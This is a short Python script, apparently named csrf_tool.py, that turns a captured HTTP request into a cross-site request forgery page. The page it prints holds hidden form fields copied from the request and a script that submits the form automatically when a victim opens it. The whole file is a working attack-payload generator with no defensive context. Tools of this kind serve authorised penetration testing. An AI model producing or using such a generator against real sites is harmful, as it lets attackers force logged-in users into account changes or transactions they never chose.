#!/usr/bin/env python3

import sys

def parse_request(request):
    lines = request.split('\n')
    method, path, _ = lines[0].split(' ')
    url = f"https://{lines[1].split(' ')[1]}{path}"

    headers = {}
    body = ""
    body_start = False

    for line in lines[1:]:
        if body_start:
            body += line
        elif line == '':
            body_start = True
        else:
            key, value = line.split(': ', 1)
            headers[key] = value
    
    return method, url, headers, body

def generate_csrf_payload(method, url, headers, body):
    params = {}
    for param in body.split('&'):
        key, value = param.split('=')
        params[key] = value

    html_form = f"""
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack</title>
</head>
<body>
    <form id="csrfForm" action="{url}" method="{method.lower()}">
    """

    for key, value in params.items():
        html_form += f'<input type="hidden" name="{key}" value="{value}">\n'

    html_form += """
    </form>
    <script type="text/javascript">
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
"""

    return html_form

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: ./csrf_tool.py '<HTTP_REQUEST>'")
        sys.exit(1)

    request = sys.argv[1]
    method, url, headers, body = parse_request(request)
    csrf_payload = generate_csrf_payload(method, url, headers, body)
    print(csrf_payload)
